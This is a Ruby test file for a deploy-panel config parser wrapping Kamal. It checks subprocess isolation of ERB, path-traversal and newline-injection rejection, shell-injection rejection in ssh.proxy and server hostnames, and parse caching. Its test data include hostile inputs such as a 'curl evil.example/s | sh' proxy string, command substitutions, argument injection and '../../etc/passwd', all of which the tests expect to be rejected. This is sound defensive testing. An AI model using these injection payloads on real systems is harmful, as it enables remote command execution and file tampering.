require "test_helper"

class Kamal::ConfigParserTest < ActiveSupport::TestCase
  # Two fake subprocesses used only by tests, to verify just these two things in
  # run_subprocess: "writing stdin is also covered by the hard timeout" and "a child
  # exiting early doesn't become an uncaught Errno::EPIPE", without depending on real
  # Kamal parsing behavior:
  #   - NeverReadsStdin: deliberately never reads stdin, to verify the parent's
  #     stdin.write doesn't hang the whole parent process.
  #   - ExitsImmediately: deliberately exits at once without reading stdin at all, to
  #     verify that when the parent's stdin.write hits an already-closed pipe, it just gets
  #     an Errno::EPIPE that is quietly swallowed rather than raised as an exception the
  #     caller sees.
  class NeverReadsStdin < Kamal::ConfigParser
    private
      def command
        [ RbConfig.ruby, "-e", "sleep 100" ]
      end
  end

  class ExitsImmediately < Kamal::ConfigParser
    private
      def command
        [ RbConfig.ruby, "-e", "exit 0" ]
      end
  end

  def simple_yaml
    file_fixture("simple_deploy.yml").read
  end

  test "parses the service name, roles and hosts" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")

    assert_equal "blog", parsed.service
    assert_equal "production", parsed.destination
    assert_equal %w[web worker], parsed.roles.map { |r| r[:name] }.sort
    assert_equal [ "127.0.0.1" ], parsed.app_hosts
    assert_equal "registry.example.com", parsed.registry_server
  end

  test "invalid YAML raises ParseError instead of crashing" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: "这不是合法的 deploy 配置")
    end

    assert_match(/./, error.message)
  end

  test "parsing runs in a subprocess: ERB in deploy.yml cannot pollute the panel process" do
    malicious = <<~YAML
      service: evil
      image: example/evil
      <%= Object.const_set(:PANEL_WAS_COMPROMISED, true) %>
      servers:
        web:
          - 127.0.0.1
    YAML

    # Whether parsing succeeds doesn't matter; what matters is that the constant does not appear in
    # this process
    begin
      Kamal::ConfigParser.call(yaml: malicious)
    rescue Kamal::ConfigParser::ParseError
      # allowed
    end

    refute defined?(::PANEL_WAS_COMPROMISED),
      "ERB was evaluated inside the panel process -- parsing is not truly isolated in the subprocess"
  end

  # destination currently has no length limit, and inflating it inflates the JSON payload
  # passed to the subprocess -- reproducing the magnitude reported in the round 3 review
  # (16 KiB growing to 98,316 bytes, far above the common 64KiB pipe buffer). Tested
  # directly via run_subprocess (skipping write_config_files): once destination is this
  # long, in the normal flow destination_path treats it as part of a filename to write to
  # disk and hits the filesystem filename length limit (ENAMETOOLONG) head-on -- that is
  # another pre-existing problem, unrelated to what's tested here ("is writing stdin
  # covered by the hard timeout"), so we don't go through the public #call full flow.
  def huge_destination
    "x" * (256 * 1024)
  end

  # --- The tests below treat destination as an attack surface: it ends up as part of a
  # filename used to build a path (this class builds it once, and Kamal builds it again in the
  # subprocess to locate the companion file), and if path separators/".." were let through, that
  # would be a path traversal surface -- the parent could be induced to write
  # destination_config_yaml to an arbitrary location outside the temp directory, and the subprocess
  # could be induced to read (and ERB-evaluate) any existing .yml on the host. -------

  test "path traversal sequences in destination are rejected (charset check) and nothing is created outside the temp dir" do
    # The target must be derived from this very same traversal payload, not written
    # separately: before, the target assumed here was Rails.root/tmp/..., but the payload
    # actually resolves to /tmp/... -- they are different files, so even if the
    # implementation wrote the file first and only raised afterward, "the assumed target
    # doesn't exist" would pass all the same, and the test would detect nothing.
    #
    # How it's derived: use exactly the same Pathname operations as destination_path
    # (join("deploy.yml").sub_ext(...).expand_path) with any base directory (here "/") --
    # as long as the number of "../" exceeds the depth of any real Dir.mktmpdir temp
    # directory, the result is clamped to the filesystem root, identical to what the
    # implementation computes from the real (unknown, random) temp directory, without
    # depending on guessing its depth.
    suffix = "tmp/PWNED_by_config_parser_test"
    traversal = ("../" * 10) + suffix
    target = Pathname.new("/").join("deploy.yml").sub_ext(".#{traversal}.yml").expand_path

    FileUtils.rm_f(target)

    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(
        yaml: simple_yaml,
        destination: traversal,
        destination_yaml: "servers:\n  web:\n    - 6.6.6.6\n"
      )
    end

    assert_match(/destination 不合法/, error.message)
    refute target.exist?,
      "path traversal sequences in destination should have been rejected, but a file was actually created outside the temp directory (#{target})"
  ensure
    FileUtils.rm_f(target)
  end

  # --- service charset validation (Critical 2, task-5 review) -----------------
  #
  # destination's charset was tightened long ago for the reason that it "gets spliced in
  # as a path segment" (see the comments on DESTINATION_FORMAT / validate_destination!
  # above), but service is the same kind of value (likewise from an untrusted deploy.yml,
  # likewise spliced by KamalLock into the lock directory name
  # "lock-#{service}-#{destination}") and never got the same validation.
  #
  # Kamal itself has a charset check on service too (configuration.rb:364,
  # `raw_config[:service] =~ /^[a-z0-9_-]+$/i`), but it uses [line anchors] (^/$) rather
  # than [string anchors] (\A/\z) -- as long as any one whole line in the string matches,
  # `=~` passes it, without requiring the whole string to match. The third test below
  # ("Kamal's own check can be bypassed with a newline") proves this: the service
  # "ok\n../../etc/passwd" is let through by Kamal's own check (the first line "ok"
  # matches on its own), and if the panel relied only on Kamal's gate, "../../etc/passwd"
  # would be handed as part of service, verbatim, to KamalLock to build the lock directory
  # path. validate_service! (\A...\z, string anchors) added in this class blocks that
  # bypass -- this is not duplicated work but defense in depth: if either layer fails on
  # its own, the other is still there. The first two tests lock in that the "plainest
  # attack surface" is still rejected at the parsing stage (whether blocked by Kamal
  # itself or by this class, the end result must be a ParseError; a service containing
  # path separators must never parse successfully).

  def yaml_with_service(service_yaml_scalar)
    <<~YAML
      service: #{service_yaml_scalar}
      image: example/blog
      servers:
        web:
          - 127.0.0.1
      registry:
        server: registry.example.com
        username: someone
        password:
          - KAMAL_REGISTRY_PASSWORD
      builder:
        arch: amd64
    YAML
  end

  test "Kamal's own validation can be bypassed with a newline, but this class's validate_service! blocks it" do
    # "\n" inside a double-quoted YAML scalar is a real newline (not a literal backslash n).
    # Kamal's /^[a-z0-9_-]+$/i only requires one whole line to match -- the first line "ok"
    # alone satisfies it -- so Kamal's own check lets the whole string through, carrying
    # "../../etc/passwd" along with it.
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_service('"ok\n../../etc/passwd"'))
    end

    assert_match(/service 不合法/, error.message,
      "this class's own validation (string anchors \\A...\\z) should reject this newline injection, " \
      "rather than letting Kamal's weaker validation (line anchors ^...$) let it through")
  end

  # --- ssh.proxy / ssh.proxy_command attack surface ---------------------------
  #
  # Reproduce and lock down the problem reported in the round 4 review:
  # bin/parse_deploy_config used to hand over config.ssh.proxy&.to_s --
  # Net::SSH::Proxy::Jump defines no meaningful #to_s, so after crossing the JSON boundary
  # it became the literal string "#<Net::SSH::Proxy::Jump:0x...>", which
  # Collectors::SshSession then passed to Net::SSH.start verbatim, blowing up with a
  # NoMethodError ("private method 'open' called for an instance of String") at real
  # connection time -- capture_many used to quietly swallow this NoMethodError as "host
  # unreachable". Now build_ssh_options/build_proxy construct the object from the raw
  # string in the parent process; what we lock in here: normal input builds a usable
  # object, and malicious input is rejected at the parsing stage rather than blowing up in
  # some odd way only when the connection is actually established.

  def yaml_with_ssh(ssh_extra)
    YAML.dump(
      "service" => "blog",
      "image" => "example/blog",
      "servers" => { "web" => [ "127.0.0.1" ] },
      "registry" => { "server" => "registry.example.com", "username" => "someone", "password" => [ "KAMAL_REGISTRY_PASSWORD" ] },
      "builder" => { "arch" => "amd64" },
      "ssh" => { "user" => "deploy", "port" => 2201 }.merge(ssh_extra)
    )
  end

  test "ssh.proxy with shell special characters (semicolon, pipe, substitution, backtick, whitespace) is rejected" do
    [
      "user@bastion; curl evil.example/s | sh",
      "user@bastion|sh",
      "user@$(whoami)",
      "user@bastion`whoami`",
      "user@bastion extra",
      "user name@bastion"
    ].each do |bad_proxy|
      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bad_proxy.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => bad_proxy), destination: "production")
      end

      assert_match(/ssh\.proxy 不合法/, error.message, "rejecting #{bad_proxy.inspect} should give an ssh.proxy format error, not some other error")
    end
  end

  # --- servers: hostname/IP, ssh.port attack surface --------------------------------
  #
  # The round 4 review pointed out: once the ssh.proxy object is constructed correctly (a
  # direct consequence of the round 1 fix), the line `IO.popen(command_line, "r+")` in
  # Net::SSH::Proxy::Command#open goes from "never reached" to "reached on the first
  # connection" -- and when Net::SSH::Proxy::Jump#build_proxy_command_equivalent builds
  # the command-line template, `%h`/`%p` come from the servers: hostname and ssh.port
  # respectively, and these two fields had no charset validation at all before this class
  # changed (Kamal itself only checks that servers values are String/Hash, not their
  # content; ssh.port is just `fetch("port", 22)`, and the string "22 ; id #" passes
  # through verbatim). What's locked in here: the two attack payloads verified to
  # actually work are rejected, plus a whole batch of attack characters in the same shape
  # as ssh.proxy, and a regression test that "normal values are unaffected".

  def yaml_with_servers(hosts)
    YAML.dump(
      "service" => "blog",
      "image" => "example/blog",
      "servers" => { "web" => hosts },
      "registry" => { "server" => "registry.example.com", "username" => "someone", "password" => [ "KAMAL_REGISTRY_PASSWORD" ] },
      "builder" => { "arch" => "amd64" },
      "ssh" => { "user" => "deploy", "port" => 2201 }
    )
  end

  # round 5 review: IPv6 moved from "should reject" to "should accept" (see the IPv6 test
  # added below), so "::1" was removed from this batch test -- not a gap in coverage, it
  # should be accepted anyway, and leaving it would only fight the new behavior.
  test "servers hostname/IP with shell special characters, control characters, multiple @, or non-ASCII is rejected" do
    [
      "1.2.3.4; touch /tmp/PWNED",
      "host|sh",
      "host`whoami`",
      "$(whoami)",
      "host name",           # whitespace
      "host\tname",          # tab
      "host\nname",          # newline
      "host\r\nname",        # CRLF
      "host\x00name",        # NUL
      "host%0aname",         # literal "%0a" (percent is not in the charset)
      "user@host@evil",      # multiple @
      "主机名.example.com",  # non-ASCII
      "-oProxyCommand=x"    # leading hyphen: see the comment above HOST_FORMAT, argument injection
    ].each do |bad_host|
      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bad_host.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_servers([ bad_host ]), destination: "production")
      end

      assert_match(/servers 里的主机名\/IP 不合法/, error.message, "rejecting #{bad_host.inspect} should give a host format error, not some other error")
    end
  end

  # Counts real subprocess runs, to tell a cache hit from a fresh parse.
  class CountingParser < Kamal::ConfigParser
    cattr_accessor :runs, default: 0

    private
      def run_subprocess(dir)
        self.class.runs += 1
        super
      end
  end

  def with_parse_cache(ttl: 10.minutes)
    previous = Rails.configuration.x.deploy_config_parse_cache_ttl
    Rails.configuration.x.deploy_config_parse_cache_ttl = ttl
    Rails.cache.clear
    CountingParser.runs = 0
    yield
  ensure
    Rails.configuration.x.deploy_config_parse_cache_ttl = previous
    Rails.cache.clear
  end

  test "the same deploy.yml is parsed in a subprocess once, then served from the cache" do
    with_parse_cache do
      first = CountingParser.call(yaml: simple_yaml, destination: "production")
      second = CountingParser.call(yaml: simple_yaml, destination: "production")

      assert_equal 1, CountingParser.runs
      assert_equal first.service, second.service
      assert_equal first.app_hosts, second.app_hosts
      # build_ssh_options rewrites a key of the result; the cached copy must not have been mutated.
      assert_equal first.ssh_options, second.ssh_options
    end
  end

  test "parse errors are not cached, so a fixed config shows up on the next call" do
    with_parse_cache do
      2.times do
        assert_raises(Kamal::ConfigParser::ParseError) { CountingParser.call(yaml: "service: [") }
      end

      assert_equal 2, CountingParser.runs
    end
  end

  test "a cached result still goes through destination validation" do
    with_parse_cache do
      CountingParser.call(yaml: simple_yaml, destination: "production")

      assert_raises(Kamal::ConfigParser::ParseError) { CountingParser.call(yaml: simple_yaml, destination: "../etc") }
      assert_equal 1, CountingParser.runs
    end
  end
end
